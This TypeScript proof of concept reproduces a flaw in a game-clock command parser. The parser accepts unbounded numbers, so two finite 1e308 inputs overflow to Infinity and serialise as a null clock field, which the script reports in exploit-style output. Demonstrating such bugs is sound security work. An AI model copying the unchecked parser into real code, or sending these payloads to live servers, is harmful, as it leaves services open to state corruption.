type Command =
  | { type: "set-game-clock"; gameClockMs: number }
  | { type: "adjust-game-clock"; deltaMs: number };

type Envelope = {
  id: string;
  clientSentAtMs: number;
  command: Command;
};

function parseCommandEnvelope(raw: string): Envelope {
  const payload = JSON.parse(raw) as unknown;

  if (
    typeof payload !== "object" ||
    payload === null ||
    Array.isArray(payload) ||
    !("id" in payload) ||
    !("clientSentAtMs" in payload) ||
    !("command" in payload)
  ) {
    throw new Error("invalid envelope");
  }

  const envelope = payload as Record<string, unknown>;
  const command = envelope.command as Record<string, unknown>;

  if (
    typeof envelope.id !== "string" ||
    envelope.id.length === 0 ||
    typeof envelope.clientSentAtMs !== "number" ||
    typeof command !== "object" ||
    command === null
  ) {
    throw new Error("invalid envelope");
  }

  if (command.type === "set-game-clock" && typeof command.gameClockMs === "number") {
    return {
      id: envelope.id,
      clientSentAtMs: envelope.clientSentAtMs,
      command: {
        type: "set-game-clock",
        gameClockMs: command.gameClockMs,
      },
    };
  }

  if (command.type === "adjust-game-clock" && typeof command.deltaMs === "number") {
    return {
      id: envelope.id,
      clientSentAtMs: envelope.clientSentAtMs,
      command: {
        type: "adjust-game-clock",
        deltaMs: command.deltaMs,
      },
    };
  }

  throw new Error("unsupported command");
}

function applyClockCommand(gameClockMs: number, command: Command) {
  if (command.type === "set-game-clock") {
    return Math.max(0, command.gameClockMs);
  }

  return Math.max(0, gameClockMs + command.deltaMs);
}

const first = parseCommandEnvelope(
  JSON.stringify({
    id: "set-large-clock",
    clientSentAtMs: 1,
    command: {
      type: "set-game-clock",
      gameClockMs: 1e308,
    },
  }),
);
if (first.command.type !== "set-game-clock") {
  throw new Error("expected set-game-clock command");
}
console.log(`[+] first command accepted: ${first.command.type} ${first.command.gameClockMs}`);

let gameClockMs = applyClockCommand(0, first.command);

const second = parseCommandEnvelope(
  JSON.stringify({
    id: "overflow-clock",
    clientSentAtMs: 2,
    command: {
      type: "adjust-game-clock",
      deltaMs: 1e308,
    },
  }),
);
if (second.command.type !== "adjust-game-clock") {
  throw new Error("expected adjust-game-clock command");
}
console.log(`[+] second command accepted: ${second.command.type} ${second.command.deltaMs}`);

gameClockMs = applyClockCommand(gameClockMs, second.command);
console.log(`[+] stored gameClockMs: ${gameClockMs}`);
console.log(`[+] finite after arithmetic: ${Number.isFinite(gameClockMs)}`);

const serialized = JSON.stringify({
  type: "game-snapshot",
  game: {
    state: {
      gameClockMs,
    },
  },
});
console.log(`[+] serialized snapshot: ${serialized}`);

const reparsed = JSON.parse(serialized) as {
  game: {
    state: {
      gameClockMs: unknown;
    };
  };
};
console.log(`[+] wire gameClockMs after JSON parse: ${String(reparsed.game.state.gameClockMs)}`);

if (reparsed.game.state.gameClockMs !== null) {
  throw new Error("expected non-finite numeric property to serialize as null");
}

console.log(
  "[+] vulnerable invariant reached: finite JSON inputs produced a null numeric wire field",
);
